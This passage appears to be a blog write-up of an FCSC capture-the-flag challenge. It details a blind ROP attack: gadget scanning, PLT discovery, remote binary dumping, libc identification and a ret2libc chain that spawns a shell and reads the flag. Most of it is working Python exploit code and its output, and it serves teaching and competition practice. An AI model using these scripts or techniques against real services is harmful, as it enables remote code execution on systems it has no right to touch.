<h3 id="Brop-gadget"><a href="#Brop-gadget" class="headerlink" title="Brop gadget"></a>Brop gadget</h3><p>Since we got the stop gadget, everything is easier. We just have to scan the .text of the remote binary to find the brop gadget which is basically the end of the csu in most of the binaries. It’s easy to find because it’s a pop of six qword like that:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>So we use a <code>probe + trap * 6 + stop + trap*20</code> payload to find these kinf od gadgets.<br>And so here is the script:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unpadd</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_stop</span>(<span class="params">s, ip, padding</span>):</span><br><span class="line">    <span class="keyword">return</span> (ip <span class="keyword">not</span> <span class="keyword">in</span> STOP_GADGETS) <span class="keyword">and</span> (s == <span class="string">b&quot;Thanks &quot;</span> + padding + unpadd(p64(ip)) + <span class="string">b&quot;&gt;&gt;&gt; &quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_brop</span>(<span class="params">padding</span>):</span><br><span class="line">    base = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x2000</span>):</span><br><span class="line">        buf = padding + p64(base + i) + p64(<span class="number">0xdeadbeef</span>) * <span class="number">6</span> + p64(STOP_GADGETS[<span class="number">0</span>])</span><br><span class="line">        resp = try_jmp(buf)</span><br><span class="line">        <span class="keyword">if</span> is_stop(resp, base+i, padding):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Output: <span class="subst">&#123;resp&#125;</span>, leak: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(p64(base + i), <span class="string">&#x27;little&#x27;</span>))&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i % <span class="number">35</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;_ - <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base + i</span><br><span class="line"></span><br><span class="line">find_brop(<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
<p>Which returns:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br><span class="line">_ - 0x0</span><br><span class="line">_ - 0x23</span><br><span class="line">_ - 0x46</span><br><span class="line">_ - 0x69</span><br><span class="line">_ - 0x8c</span><br><span class="line">_ - 0xaf</span><br><span class="line">_ - 0xd2</span><br><span class="line">_ - 0xf5</span><br><span class="line">_ - 0x118</span><br><span class="line">_ - 0x13b</span><br><span class="line">_ - 0x15e</span><br><span class="line">_ - 0x181</span><br><span class="line">_ - 0x1a4</span><br><span class="line">_ - 0x1c7</span><br><span class="line">_ - 0x1ea</span><br><span class="line">_ - 0x20d</span><br><span class="line">_ - 0x230</span><br><span class="line">_ - 0x253</span><br><span class="line">_ - 0x276</span><br><span class="line">_ - 0x299</span><br><span class="line">_ - 0x2bc</span><br><span class="line">_ - 0x2df</span><br><span class="line">_ - 0x302</span><br><span class="line">_ - 0x325</span><br><span class="line">_ - 0x348</span><br><span class="line">_ - 0x36b</span><br><span class="line">_ - 0x38e</span><br><span class="line">_ - 0x3b1</span><br><span class="line">_ - 0x3d4</span><br><span class="line">_ - 0x3f7</span><br><span class="line">_ - 0x41a</span><br><span class="line">_ - 0x43d</span><br><span class="line">_ - 0x460</span><br><span class="line">_ - 0x483</span><br><span class="line">_ - 0x4a6</span><br><span class="line">_ - 0x4c9</span><br><span class="line">_ - 0x4ec</span><br><span class="line">_ - 0x50f</span><br><span class="line">_ - 0x532</span><br><span class="line">_ - 0x555</span><br><span class="line">_ - 0x578</span><br><span class="line">_ - 0x59b</span><br><span class="line">_ - 0x5be</span><br><span class="line">_ - 0x5e1</span><br><span class="line">_ - 0x604</span><br><span class="line">_ - 0x627</span><br><span class="line">_ - 0x64a</span><br><span class="line">_ - 0x66d</span><br><span class="line">_ - 0x690</span><br><span class="line">_ - 0x6b3</span><br><span class="line">_ - 0x6d6</span><br><span class="line">_ - 0x6f9</span><br><span class="line">_ - 0x71c</span><br><span class="line">Output: b&#x27;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\x07@&gt;&gt;&gt; &#x27;, leak: 0x40073a</span><br></pre></td></tr></table></figure>

<p>Since we got this gadget we can control <code>rdi</code> and <code>rsi</code> because of some misaligned instructions !</p>
<h3 id="Procedure-linkage-table-PLT"><a href="#Procedure-linkage-table-PLT" class="headerlink" title="Procedure linkage table (PLT)"></a>Procedure linkage table (PLT)</h3><p>The next step would be to leak the PLT to see if there is a puts, printf, or write functions.<br>To find the PLT there is three rules:</p>
<ul>
<li>The addresses of each stub are 16 bytes aligned</li>
<li>If we jmp one time on a candidate we can check it’s a PLT entry by jumping at <code>entry+6</code> which is the address of the slowpath jump in the GOT. And so the behaviour should be the same.</li>
<li>We can give arguments like valid pointers in <code>rdi</code> and <code>rsi</code> to identify functions like puts, strcmp etc.</li>
</ul>
<p>I used so a payload’s structure like this: <code>padding + POP_RDI + 0x400000 + POP_RSI_R15 + 0x400000 + probe + stop + trap</code><br>That’s how I developped this function:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POP_RDI = CSU_POP+<span class="number">0x9</span></span><br><span class="line">POP_RSI_R15 = CSU_POP+<span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpadd</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_stop</span>(<span class="params">s, ip, padding</span>):</span><br><span class="line">    <span class="keyword">return</span> (ip <span class="keyword">not</span> <span class="keyword">in</span> STOP_GADGETS) <span class="keyword">and</span> (s == <span class="string">b&quot;Thanks &quot;</span> + padding + unpadd(p64(ip)) + <span class="string">b&quot;&gt;&gt;&gt; &quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_plt</span>(<span class="params">padding</span>):</span><br><span class="line">    base = <span class="number">0x400000</span> </span><br><span class="line">    s = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0</span>, <span class="number">0x3000</span>, <span class="number">0x10</span>):</span><br><span class="line">        resp1 = try_jmp(padding + p64(POP_RDI) + p64(<span class="number">0x400000</span>) + p64(POP_RSI_R15) + p64(<span class="number">0x400000</span>)*<span class="number">2</span> + p64(base+i) + p64(STOP_GADGETS[<span class="number">0</span>]) + p64(<span class="number">0xdeadbeef</span>)) <span class="comment"># I used the base address because it&#x27;s an recognizable pattern</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_stop(resp1, base+i, padding):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Output: <span class="subst">&#123;resp1.<span class="built_in">hex</span>()&#125;</span>, leak: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(p64(base + i), <span class="string">&#x27;little&#x27;</span>))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(resp1):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>] Out: <span class="subst">&#123;resp1.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>And we got this:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br><span class="line">[0x400500] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201010a3e3e3e20</span><br><span class="line">[0x400510] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201013e3e3e20</span><br><span class="line">[0x400520] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20</span><br><span class="line">[0x400570] Out: 5468616e6b73204141414141414141414141414141414141414141414141414141414141414141414141414141414143074048656c6c6f20796f752e0a5768617420697320796f7572206e616d65203f0a3e3e3e20</span><br><span class="line">[0x4005d0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20</span><br><span class="line">[0x400610] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20</span><br><span class="line">[0x400630] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20</span><br><span class="line">[0x400640] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20</span><br><span class="line">[0x4006e0] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20</span><br><span class="line">[0x400750] Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20</span><br></pre></td></tr></table></figure>
<p>Awesome ! We got a leak of the binary in two gadgets !</p>
<h3 id="Leaking-the-binary"><a href="#Leaking-the-binary" class="headerlink" title="Leaking the binary"></a>Leaking the binary</h3><p>Since we can leak an arbitrary location it’s really easier !<br>We can see that the patter which leaks is like: <code>Thanks + padding + unpadd(p64(POP_RDI)) + leak_upto_null_byte</code>.<br>So we can leak all the binary from the base address:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">STOP_GADGETS = [<span class="number">0x400668</span>]</span><br><span class="line">POP_RDI = CSU_POP+<span class="number">0x9</span></span><br><span class="line">POP_RSI_R15 = CSU_POP+<span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpadd</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_binary</span>(<span class="params">padding, base</span>):</span><br><span class="line">    gadget_leak = <span class="number">0x400510</span></span><br><span class="line">    i = <span class="number">0</span> </span><br><span class="line">    buf = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">b&quot;Thanks &quot;</span> + padding + unpadd(p64(POP_RDI))</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;leet_dump.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> base+i &lt; <span class="number">0x400fff</span>: <span class="comment"># guessed end to the binary .text</span></span><br><span class="line">        resp1 = try_jmp(padding + p64(POP_RDI) + p64(base+i) + p64(POP_RSI_R15) + p64(<span class="number">0x0</span>)*<span class="number">2</span> + p64(gadget_leak) + p64(STOP_GADGETS[<span class="number">0</span>]) + p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(resp1): <span class="comment"># somtimes there is no repsonse</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        leak = resp1[<span class="built_in">len</span>(pattern):resp1.index(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)] <span class="comment"># get the leaked part</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(leak): <span class="comment"># if no leak it means it&#x27;s a null byte</span></span><br><span class="line">            buf += <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] recv @ <span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>: 0x00&quot;</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># else we got raw data leaked</span></span><br><span class="line">            buf += leak</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] recv @ <span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>: <span class="subst">&#123;leak.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            i = i + <span class="built_in">len</span>(leak)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buf) &gt;= <span class="number">0x100</span>: <span class="comment"># we write bytes to the file each 0x100 bytes</span></span><br><span class="line">            f.write(buf)</span><br><span class="line">            buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Buffering ..&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>Because of my connection I have to relaunch the script with a different base address to dump the whole binary but anyway, it works !</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br><span class="line">[skip]</span><br><span class="line">[*] recv @ 0x400fff: 0x00</span><br><span class="line">STOP: &lt;class &#x27;KeyboardInterrupt&#x27;&gt;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br></pre></td></tr></table></figure>

<p>Since we dumped the binary we just need to build a classic ropchain by leaking the address of <code>FFLUSH</code> in the GOT and then compute the base address of the libc. It’s interesting to see that we don’t know what libc it is. So we can use <a target="_blank" rel="noopener" href="https://libc.blukat.me/">this</a> to find from the offset of fflush and read, the right version. Which gives:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main 	0x021a50 	0x0</span><br><span class="line">system 	0x041490 	0x1fa40</span><br><span class="line">fflush 	0x069ab0 	0x48060</span><br><span class="line">open 	0x0db950 	0xb9f00</span><br><span class="line">read 	0x0dbb90 	0xba140</span><br><span class="line">write 	0x0dbbf0 	0xba1a0</span><br><span class="line">str_bin_sh 	0x1633e8 	0x141998</span><br></pre></td></tr></table></figure>

<h2 id="Put-everything-together"><a href="#Put-everything-together" class="headerlink" title="Put everything together"></a>Put everything together</h2><p>I’ll no detail a lot the final part because it’s a basic rop payload. But since we got the right gadgets from the leaked binary, it’s very easy. We have to notice that this exploit is not 100% reiable, if the address of FFLUSH in the GOT has a NULL byte the exploit will not work. Here is the final function:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">STOP_GADGETS = [<span class="number">0x400668</span>]</span><br><span class="line"></span><br><span class="line">CSU_POP = <span class="number">0x40073a</span></span><br><span class="line">POP_RDI = CSU_POP+<span class="number">0x9</span></span><br><span class="line">POP_RSI_R15 = CSU_POP+<span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">GADGET_LEAK = <span class="number">0x400510</span></span><br><span class="line">FFLUSH_GOT = <span class="number">0x400000</span> + <span class="number">0x200FF0</span></span><br><span class="line">FFLUSH_OFFSET = <span class="number">0x069ab0</span></span><br><span class="line">OFFT_BINSH = <span class="number">0x1633e8</span></span><br><span class="line"></span><br><span class="line">SYSTEM = <span class="number">0x041490</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp_flow</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp, io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flow</span>(<span class="params">padding</span>):</span><br><span class="line">    payload = padding</span><br><span class="line">    payload += p64(POP_RDI)</span><br><span class="line">    payload += p64(FFLUSH_GOT)</span><br><span class="line">    payload += p64(POP_RSI_R15) + p64(<span class="number">0xffffffffffffffff</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(GADGET_LEAK)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span> + <span class="number">0x656</span>) <span class="comment"># ret2main</span></span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">b&quot;Thanks &quot;</span> + padding + unpadd(p64(POP_RDI))</span><br><span class="line">    resp_tmp, io = try_jmp_flow(payload)</span><br><span class="line">    <span class="built_in">print</span>(resp_tmp)</span><br><span class="line">    leak_fflush = <span class="built_in">int</span>.from_bytes(resp_tmp[<span class="built_in">len</span>(pattern):resp_tmp.index(<span class="string">b&#x27;What is&#x27;</span>)], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc = leak_fflush - FFLUSH_OFFSET </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;libc @ <span class="subst">&#123;<span class="built_in">hex</span>(libc)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = padding</span><br><span class="line">    payload += p64(POP_RDI)</span><br><span class="line">    payload += p64(libc + OFFT_BINSH)</span><br><span class="line">    payload += p64(libc + SYSTEM)</span><br><span class="line"></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">flow(<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br></pre></td></tr></table></figure>

<p>And when we run it, we got a shell yeeeeeah !</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./solve.py</span></span><br><span class="line">b&#x27;Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@\xb0J\xa2\xd7&lt;\x7fWhat is your name ?\n&gt;&gt;&gt; &#x27;</span><br><span class="line">libc @ 0x7f3cd79bb000</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> flag</span></span><br><span class="line">FCSC&#123;3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28&#125;</span><br></pre></td></tr></table></figure>

<p>Here is the final script:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 